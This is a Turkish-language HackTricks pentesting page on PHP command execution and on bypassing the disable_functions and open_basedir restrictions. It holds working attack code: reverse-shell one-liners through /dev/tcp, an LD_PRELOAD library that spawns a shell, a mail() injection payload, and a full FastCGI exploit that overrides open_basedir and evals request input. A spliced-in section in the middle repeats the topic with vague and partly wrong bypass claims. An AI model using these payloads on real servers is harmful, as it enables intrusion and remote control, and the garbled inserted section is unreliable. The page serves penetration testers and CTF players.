# PHP - Useful Functions & disable\_functions/open\_basedir bypass

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

## PHP Komut ve Kod Çalıştırma

### PHP Komut Çalıştırma

**Not:** [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) php webshell, aşağıdaki fonksiyonları devre dışı bırakırsa **otomatik olarak** kontrol edebilir ve bypass edebilir.

**exec** - Komut çıktısının son satırını döndürür

```bash
echo exec("uname  -a");
```

**passthru** - Komut çıktısını doğrudan tarayıcıya iletiyor.

```bash
echo passthru("uname -a");
```

**system** - Komut çıktısını doğrudan tarayıcıya aktarır ve son satırı döndürür

```bash
echo system("uname -a");
```

**shell\_exec** - Komutların çıktısını döndürür

```bash
echo shell_exec("uname -a");
```

\`\` (ters tırnak) - shell\_exec() ile aynı işlevi görür.

```bash
echo `uname -a`
```

**popen** - Bir komutun işlemine okuma veya yazma boru açar.

```bash
echo fread(popen("/bin/ls /", "r"), 4096);
```

**proc\_open** - popen() ile benzer ancak daha fazla kontrol sağlar

```bash
proc_close(proc_open("uname -a",array(),$something));
```

**preg\_replace**

`preg_replace` işlevi, bir dize içindeki desenleri arayıp değiştirmek için kullanılır. Bu işlev, bir dize içindeki belirli bir deseni bulup başka bir dizeyle değiştirmenizi sağlar.

**Kullanımı:**

```php
preg_replace($pattern, $replacement, $subject);
```

* `$pattern`: Değiştirilecek desen veya desenlerin bir dizi.
* `$replacement`: Değiştirme işlemi için kullanılacak dize veya dizelerin bir dizi.
* `$subject`: Değiştirme işlemi yapılacak olan dize veya dizelerin bir dizi.

**Örnek:**

```php
$string = "Merhaba, dünya!";
$pattern = "/dünya/";
$replacement = "evren";
$newString = preg_replace($pattern, $replacement, $string);
echo $newString; // Çıktı: Merhaba, evren!
```

Bu örnekte, `$string` değişkenindeki "dünya" deseni, "evren" ile değiştirilir ve `$newString` değişkenine atanır. Sonuç olarak, "Merhaba, dünya!" ifadesi "Merhaba, evren!" olarak değiştirilir ve ekrana yazdırılır.

```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```

**pcntl\_exec** - Bir programı çalıştırır (modern ve modern olmayan PHP'de bu işlevi kullanmak için varsayılan olarak `pcntl.so` modülünü yüklemeniz gerekir)

```bash
pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);
```

**mail / mb\_send\_mail** - Bu işlev, postaları göndermek için kullanılır, ancak `$options` parametresi içine keyfi komutlar enjekte etmek için de kötüye kullanılabilir. Bunun nedeni, **php `mail` işlevinin** genellikle sistem içindeki `sendmail` ikili dosyasını çağırması ve ekstra seçenekler eklemenize izin vermesidir. Ancak, yürütülen komutun çıktısını göremeyeceksiniz, bu yüzden çıktıyı bir dosyaya yazan bir kabuk komut dosyası oluşturmanız, bunu posta ile çalıştırmanız ve çıktıyı yazdırmanız önerilir:

```bash
file_put_contents('/www/readflag.sh', base64_decode('IyEvYmluL3NoCi9yZWFkZmxhZyA+IC90bXAvZmxhZy50eHQKCg==')); chmod('/www/readflag.sh', 0777);  mail('', '', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');
```

**dl** - Bu işlev, bir PHP uzantısını dinamik olarak yüklemek için kullanılabilir. Bu işlev her zaman mevcut olmayabilir, bu yüzden sömürülmeye çalışmadan önce mevcut olup olmadığını kontrol etmelisiniz. Bu işlevi nasıl sömürüleceğini öğrenmek için [bu sayfayı okuyun](disable\_functions-bypass-dl-function.md).

### PHP Kodu Yürütme

Eval dışında PHP kodunu yürütmek için başka yollar da vardır: include/require, Yerel Dosya Dahil Etme ve Uzaktan Dosya Dahil Etme zafiyetleri şeklinde uzaktan kod yürütme için kullanılabilir.

```php
${<php code>}              // If your input gets reflected in any PHP string, it will be executed.
eval()
assert()                   //  identical to eval()
preg_replace('/.*/e',...)  // e does an eval() on the match
create_function()          // Create a function and use eval()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);

$func = new ReflectionFunction($_GET['func_name']);
$func->invoke();
// or
$func->invokeArgs(array());

// or serialize/unserialize function
```

## disable\_functions & open\_basedir

**disable\_functions** (devre dışı bırakılan fonksiyonlar), PHP'de `.ini` dosyalarında yapılandırılabilen ve belirtilen fonksiyonların kullanımını **yasaklayan** bir ayar seçeneğidir. **open\_basedir** (açık tabanlıdır), PHP'ye erişebileceği klasörü belirten bir ayar seçeneğidir.\
PHP ayarları genellikle _/etc/php7/conf.d_ veya benzeri bir yol üzerinde yapılandırılır.

Her iki yapılandırma da **`phpinfo()`** çıktısında görülebilir:

![](https://0xrick.github.io/images/hackthebox/kryptos/17.png)

![](<../../../../.gitbook/assets/image (347).png>)

## open\_basedir Bypass

`open_basedir`, PHP'nin erişebileceği klasörleri yapılandırır. Bu klasörlerin dışında herhangi bir dosyayı yazma/okuma/çalıştırma yapamazsınız, ayrıca diğer dizinleri de **listelemek mümkün olmaz**.\
Ancak, herhangi bir şekilde keyfi PHP kodunu çalıştırabiliyorsanız, aşağıdaki kod parçacığını kullanarak kısıtlamayı **atlamayı deneyebilirsiniz**.

### glob:// bypass ile dizinleri listeleme

Bu ilk örnekte, `glob://` protokolü ile bazı yol atlamaları kullanılır:

```php
<?php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
$it = new DirectoryIterator("glob:///v??/run/.*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
sort($file_list);
foreach($file_list as $f){
echo "{$f}<br/>";
}
```

**Not1**: Yolda ayrıca `/e??/*` kullanarak `/etc/*` ve diğer herhangi bir klasörü listeleyebilirsiniz.\
**Not2**: Kodun bir kısmının tekrarlandığı gibi görünüyor, ancak aslında bu gereklidir!\
**Not3**: Bu örnek yalnızca klasörleri listelemek için kullanışlıdır

### Tam open\_basedir bypass'ı FastCGI'yi suiistimal ederek

PHP-FPM ve FastCGI hakkında daha fazla bilgi edinmek isterseniz, [bu sayfanın ilk bölümünü](disable\_functions-bypass-php-fpm-fastcgi.md) okuyabilirsiniz.\
Eğer **`php-fpm`** yapılandırılmışsa, **open\_basedir'yi tamamen atlamak** için onu suiistimal edebilirsiniz:

![](<../../../../.gitbook/assets/image (350).png>)

![](<../../../../.gitbook/assets/image (349).png>)

İlk yapmanız gereken şey, **php-fpm'nin unix soketinin** nerede olduğunu bulmaktır. Genellikle `/var/run` altında olur, bu yüzden **önceki kodu kullanarak dizini listeleyebilir ve bulabilirsiniz**.\
Kod [buradan](https://balsn.tw/ctf\_writeup/20190323-0ctf\_tctf2019quals/#wallbreaker-easy) alınmıştır.

````php
<?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron <pierrick@webstart.fr>
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this->_host = $host;
$this->_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this->_keepAlive = (boolean)$b;
if (!$this->_keepAlive && $this->_sock) {
fclose($this->_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this->_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this->_sock) {
//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
$this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
if (!$this->_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
. chr($requestId & 0xFF)        /* requestIdB0 */
. chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
. chr($clen & 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen < 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
$nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
}
if ($vlen < 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
$nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
}
/* nameData & valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen >= 128) {
$nlen = ($nlen & 0x7F << 24);
$nlen |= (ord($data{$p++}) << 16);
$nlen |= (ord($data{$p++}) << 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen >= 128) {
$vlen = ($nlen & 0x7F << 24);
$vlen |= (ord($data{$p++}) << 16);
$vlen |= (ord($data{$p++}) << 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this->_sock, self::HEADER_LEN)) {
$resp = $this->decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len && $buf=fread($this->_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this->_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this->connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this->buildNvpair($info, '');
}
fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
$resp = $this->readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this->readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
```php
* @return String
*/
public function request(array $params, $stdin)
{
$response = '';
$this->connect();
$request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsRequest = '';
foreach ($params as $key => $value) {
$paramsRequest .= $this->buildNvpair($key, $value);
}
if ($paramsRequest) {
$request .= $this->buildPacket(self::PARAMS, $paramsRequest);
}
$request .= $this->buildPacket(self::PARAMS, '');
if ($stdin) {
$request .= $this->buildPacket(self::STDIN, $stdin);
}
$request .= $this->buildPacket(self::STDIN, '');
fwrite($this->_sock, $request);
do {
$resp = $this->readPacket();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
$response .= $resp['content'];
}
} while ($resp && $resp['type'] != self::END_REQUEST);
var_dump($resp);
if (!is_array($resp)) {
throw new Exception('Bad request');
}
switch (ord($resp['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('Bu uygulama çoklu bağlantı yapamaz [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('Yeni istek reddedildi; çok meşgul [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Rol değeri bilinmiyor [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// gerçek saldırı burada başlar
if (!isset($_REQUEST['cmd'])) {
die("Girişinizi kontrol edin\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // php payload -- Herhangi bir şey yapmaz
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>
````

Bu betikler, **php-fpm'nin unix soketine** (genellikle /var/run'da bulunur) isteğe bağlı kodu yürütmek için iletişim kurar. **PHP\_VALUE** özniteliği ile gönderilen **open\_basedir** ayarları üzerine yazılacaktır.\
`eval`'in, **cmd** parametresi içinde gönderdiğiniz PHP kodunu yürütmek için nasıl kullanıldığına dikkat edin.\
Ayrıca, **yorum satırı 324**'e dikkat edin, onu açabilir ve **payload, belirtilen URL'ye otomatik olarak bağlanacak ve orada bulunan PHP kodunu** yürütecektir.\
Sadece `/etc/passwd` dosyasının içeriğini almak için `http://vulnerable.com:1337/l.php?cmd=echo file_get_contents('/etc/passwd');` adresine erişin.

{% hint style="warning" %}
Muhtemelen `open_basedir` yapılandırmasını üzerine yazdığımız gibi **`disable_functions`'ı da üzerine yazabiliriz** diye düşünüyorsunuz. Deneyin, ancak çalışmayacak, görünüşe göre **`disable_functions` yalnızca bir `.ini` php** yapılandırma dosyasında yapılandırılabilir ve PHP\_VALUE kullanarak yaptığınız değişiklikler bu belirli ayar üzerinde etkili olmayacaktır.
{% endhint %}

## disable\_functions Atlatma

Eğer bir makine içinde PHP kodu yürütme yeteneğine sahipseniz, muhtemelen bir sonraki seviyeye geçmek ve **keyfi sistem komutları yürütmek** istersiniz. Bu durumda, genellikle **`disable_functions`'da devre dışı bırakılan veya tüm PHP işlevlerinin keyfi sistem komutları yürütmeye izin veren işlevlerin devre dışı bırakıldığını** keşfedeceksiniz.\
Bu kısıtlamayı nasıl atlayabileceğinizi görelim (eğer atlayabilirseniz)

### Otomatik atlatma keşfi

[https://github.com/teambi0s/dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser) aracını kullanabilir ve size **`disable_functions`'ı atlamak için hangi işlevi (varsa) kullanabileceğinizi** gösterecektir.

### Diğer sistem işlevlerini kullanarak atlatma

Bu sayfanın başına dönün ve **komut yürütme işlevlerinden herhangi birinin devre dışı bırakılmadığını ve ortamda kullanılabilir olduğunu** kontrol edin. Eğer bunlardan sadece birini bulursanız, keyfi sistem komutlarını yürütmek için onu kullanabilirsiniz.

### LD\_PRELOAD atlatması

PHP'de `mail()` gibi bazı işlevlerin, **sistem içinde ikili dosyaları yürüteceği** iyi bilinmektedir. Bu nedenle, bunları herhangi bir şeyi yürütebilen keyfi bir kitaplık yüklemeleri için `LD_PRELOAD` ortam değişkenini kullanabilirsiniz.

#### LD\_PRELOAD ile disable\_functions atlatmak için kullanılabilecek işlevler

* **`mail`**
* **`mb_send_mail`**: `php-mbstring` modülü yüklü olduğunda etkilidir.
* **`imap_mail`**: `php-imap` modülü mevcutsa çalışır.
* **`libvirt_connect`**: `php-libvirt-php` modülü gerektirir.
* **`gnupg_init`**: `php-gnupg` modülü yüklüyse kullanılabilir.
* **`new imagick()`**: Bu sınıf, kısıtlamaları atlamak için kötüye kullanılabilir. Detaylı saldırı teknikleri için kapsamlı bir [**yazı burada**](https://blog.bi0s.in/2019/10/23/Web/BSidesDelhi19-evalme/) bulunabilir.

Bu işlevleri bulmak için kullanılan [**fuzzing betiğini burada**](https://github.com/tarunkant/fuzzphunc/blob/master/lazyFuzzer.py) bulabilirsiniz.

`LD_PRELOAD` ortam değişkenini kötüye kullanmak için derleyebileceğiniz bir kitaplık aşağıda verilmiştir:

```php
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

uid_t getuid(void){
unsetenv("LD_PRELOAD");
system("bash -c \"sh -i >& /dev/tcp/127.0.0.1/1234 0>&1\"");
return 1;
}
```

#### Chankro Kullanarak Geçme

Bu yanlış yapılandırmayı istismar etmek için [**Chankro**](https://github.com/TarlogicSecurity/Chankro) kullanabilirsiniz. Bu, **yüklemeniz gereken bir PHP saldırısı** üretecek bir araçtır ve bu saldırıyı savunmasız sunucuya yükleyip çalıştırmanız gerekmektedir (web üzerinden erişin).\
**Chankro**, kurbanın diske yazmak istediğiniz **kütüphane ve ters kabuğu** yazacak ve ters kabuğu çalıştırmak için\*\*`LD_PRELOAD` hilesini ve PHP `mail()`\*\* fonksiyonunu kullanacaktır.

**Chankro**'yu kullanmak için, `mail` ve `putenv`'in **`disable_functions` listesinde görünmemesi gerekmektedir**.\
Aşağıdaki örnekte, **arch 64** için bir chankro saldırısı oluşturmanın nasıl yapıldığını görebilirsiniz. Bu saldırı, `whoami`'yi çalıştıracak ve çıktıyı _/tmp/chankro\_shell.out_ dosyasına kaydedecektir. Chankro, **kütüphane ve payload**'u _/tmp_ dizinine yazacak ve **son saldırı** **bicho.php** olarak adlandırılacaktır (bu dosyayı kurban sunucuya yüklemeniz gerekmektedir):

{% tabs %}
{% tab title="shell.sh" %}
```php
#!/bin/sh
whoami > /tmp/chankro_shell.out
```

## PHP Kullanışlı Fonksiyonlar: disable\_functions ve open\_basedir Bypass

Bu bölümde, PHP'de disable\_functions ve open\_basedir gibi iki önemli güvenlik mekanizmasını nasıl bypass edebileceğimizi öğreneceğiz.

### disable\_functions Bypass

disable\_functions, PHP'de belirli fonksiyonların kullanımını devre dışı bırakmamıza olanak tanıyan bir yapılandırma seçeneğidir. Ancak, bu mekanizmayı bypass etmek mümkündür. İşte bazı bypass teknikleri:

#### exec() Fonksiyonunu Bypass Etmek

exec() fonksiyonu, sistem komutlarını çalıştırmak için kullanılır ve genellikle disable\_functions listesinde bulunur. Bununla birlikte, bu fonksiyonu bypass etmek için aşağıdaki yöntemleri kullanabilirsiniz:

1. system() Fonksiyonunu Kullanmak: system() fonksiyonu, exec() fonksiyonunun yerine kullanılabilir ve disable\_functions listesinde genellikle bulunmaz.
2.  Backtick Operatörünü Kullanmak: Backtick operatörü (\`) ile sistem komutlarını çalıştırabilirsiniz. Örneğin:

    ```php
    `$command`
    ```
3. passthru() Fonksiyonunu Kullanmak: passthru() fonksiyonu, sistem komutlarını çalıştırır ve komut çıktısını doğrudan ekrana yazar. Bu fonksiyonu kullanarak disable\_functions listesindeki exec() fonksiyonunu bypass edebilirsiniz.

#### shell\_exec() Fonksiyonunu Bypass Etmek

shell\_exec() fonksiyonu, bir komutu çalıştırır ve çıktısını bir dize olarak döndürür. Bu fonksiyonu bypass etmek için aşağıdaki yöntemleri kullanabilirsiniz:

1. passthru() Fonksiyonunu Kullanmak: passthru() fonksiyonu, shell\_exec() fonksiyonunun yerine kullanılabilir ve disable\_functions listesinde genellikle bulunmaz.
2. popen() Fonksiyonunu Kullanmak: popen() fonksiyonu, bir komutu çalıştırır ve çıktısını bir dosya tanıtıcısı olarak döndürür. Bu fonksiyonu kullanarak shell\_exec() fonksiyonunu bypass edebilirsiniz.

### open\_basedir Bypass

open\_basedir, PHP'de belirli bir dizin hiyerarşisi içindeki dosyalara erişimi sınırlayan bir yapılandırma seçeneğidir. Ancak, bu mekanizmayı bypass etmek mümkündür. İşte bazı bypass teknikleri:

#### Symlink Saldırısı

Symlink saldırısı, open\_basedir sınırlamalarını bypass etmek için kullanılan bir tekniktir. Bu saldırıda, hedef dizinle aynı ada sahip bir sembolik bağlantı oluşturarak open\_basedir sınırlamalarını atlayabilirsiniz.

#### realpath() Fonksiyonunu Bypass Etmek

realpath() fonksiyonu, bir dosya veya dizinin gerçek yoluyla ilgili bilgileri döndürür. Bu fonksiyonu bypass etmek için aşağıdaki yöntemleri kullanabilirsiniz:

1. stream\_resolve\_include\_path() Fonksiyonunu Kullanmak: stream\_resolve\_include\_path() fonksiyonu, bir dosyanın gerçek yolunu döndürür ve open\_basedir sınırlamalarını bypass etmek için kullanılabilir.
2. getcwd() Fonksiyonunu Kullanmak: getcwd() fonksiyonu, çalışma dizinini döndürür ve open\_basedir sınırlamalarını bypass etmek için kullanılabilir.

Bu teknikleri kullanarak disable\_functions ve open\_basedir gibi güvenlik mekanizmalarını bypass edebilir ve hedef sisteme erişim sağlayabilirsiniz. Ancak, bu teknikleri yalnızca yasal ve etik sınırlar içinde kullanmalısınız.

```bash
python2 chankro.py --arch 64 --input shell.sh --path /tmp --output bicho.php
```
{% endtab %}
{% endtabs %}

Eğer **mail** fonksiyonunun devre dışı bırakıldığını fark ederseniz, yine de **mb\_send\_mail** fonksiyonunu kullanabilirsiniz.\
Bu teknik ve Chankro hakkında daha fazla bilgi için: [https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/](https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/)

### PHP yeteneklerini kullanarak "Bypass" yapma

Unutmayın ki **PHP** kullanarak dosya okuyabilir, yazabilir, dizin oluşturabilir ve izinleri değiştirebilirsiniz.\
Hatta veritabanlarını bile dökümleyebilirsiniz.\
Belki **PHP** kullanarak kutuyu numaralandırarak ayrıcalıkları yükseltme/komutları yürütme yolu bulabilirsiniz (örneğin, bazı özel ssh anahtarlarını okuma).

Bu işlemleri çok kolay bir şekilde gerçekleştirmenizi sağlayan bir web kabuğu oluşturdum (çoğu web kabuğu da size bu seçenekleri sunacaktır): [https://github.com/carlospolop/phpwebshelllimited](https://github.com/carlospolop/phpwebshelllimited)

### Modül/Sürüm bağımlı bypasslar

Eğer belirli bir modül kullanılıyorsa veya belirli bir PHP sürümünü sömürüyorsanız, disable\_functions'ı atlayabileceğiniz birkaç yol vardır:

* [**FastCGI/PHP-FPM (FastCGI Process Manager)**](disable\_functions-bypass-php-fpm-fastcgi.md)
* [**FFI - Foreign Function Interface etkinleştirilmiş Bypass**](https://github.com/carlospolop/hacktricks/blob/tr/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable\_functions-open\_basedir-bypass/broken-reference/README.md)
* [**mem üzerinden Bypass**](disable\_functions-bypass-via-mem.md)
* [**mod\_cgi**](disable\_functions-bypass-mod\_cgi.md)
* [**PHP Perl Uzantısı Safe\_mode**](disable\_functions-bypass-php-perl-extension-safe\_mode-bypass-exploit.md)
* [**dl fonksiyonu**](disable\_functions-bypass-dl-function.md)
* [**Bu exploit**](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)
* 5.\* - PoC'ye küçük değişikliklerle sömürülebilir
* 7.0 - şu ana kadar tüm sürümler
* 7.1 - şu ana kadar tüm sürümler
* 7.2 - şu ana kadar tüm sürümler
* 7.3 - şu ana kadar tüm sürümler
* 7.4 - şu ana kadar tüm sürümler
* 8.0 - şu ana kadar tüm sürümler
* [**7.0'dan 8.0'e exploit (yalnızca Unix)**](https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php)
* [**PHP 7.0=7.4 (\*nix)**](disable\_functions-bypass-php-7.0-7.4-nix-only.md#php-7-0-7-4-nix-only)
* [**Imagick 3.3.0 PHP >= 5.4**](disable\_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md)
* [**PHP 5.x Shellsock**](disable\_functions-php-5.x-shellshock-exploit.md)
* [**PHP 5.2.4 ionCube**](disable\_functions-php-5.2.4-ioncube-extension-exploit.md)
* [**PHP <= 5.2.9 Windows**](disable\_functions-bypass-php-less-than-5.2.9-on-windows.md)
* [**PHP 5.2.4/5.2.5 cURL**](disable\_functions-bypass-php-5.2.4-and-5.2.5-php-curl.md)
* [**PHP 5.2.3 -Win32std**](disable\_functions-bypass-php-5.2.3-win32std-ext-protections-bypass.md)
* [**PHP 5.2 FOpen exploit**](disable\_functions-bypass-php-5.2-fopen-exploit.md)
* [**PHP 4 >= 4.2.-, PHP 5 pcntl\_exec**](disable\_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl\_exec.md)

### **Otomatik Araç**

Aşağıdaki betik burada yorumlanan yöntemlerin bazılarını denemektedir:\
[https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php](https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php)

## Diğer İlginç PHP fonksiyonları

### Geri çağırma kabul eden fonksiyonlar listesi

Bu fonksiyonlar, saldırganın istediği bir fonksiyonu çağırmak için kullanılabilecek bir dize parametresini kabul eder. Saldırganın bir parametre geçme yeteneği olup olmadığı fonksiyona bağlıdır. Bu durumda phpinfo() gibi bir Bilgi Açığını ifşa eden bir fonksiyon kullanılabilir.

[Callbacks / Callables](https://www.php.net/manual/en/language.types.callable.php)

[Aşağıdaki listeler buradan alınmıştır](https://stackoverflow.com/questions/3115559/exploitable-php-functions)

```php
// Function => Position of callback arguments
'ob_start' => 0,
'array_diff_uassoc' => -1,
'array_diff_ukey' => -1,
'array_filter' => 1,
'array_intersect_uassoc' => -1,
'array_intersect_ukey' => -1,
'array_map' => 0,
'array_reduce' => 1,
'array_udiff_assoc' => -1,
'array_udiff_uassoc' => array(-1, -2),
'array_udiff' => -1,
'array_uintersect_assoc' => -1,
'array_uintersect_uassoc' => array(-1, -2),
'array_uintersect' => -1,
'array_walk_recursive' => 1,
'array_walk' => 1,
'assert_options' => 1,
'uasort' => 1,
'uksort' => 1,
'usort' => 1,
'preg_replace_callback' => 1,
'spl_autoload_register' => 0,
'iterator_apply' => 1,
'call_user_func' => 0,
'call_user_func_array' => 0,
'register_shutdown_function' => 0,
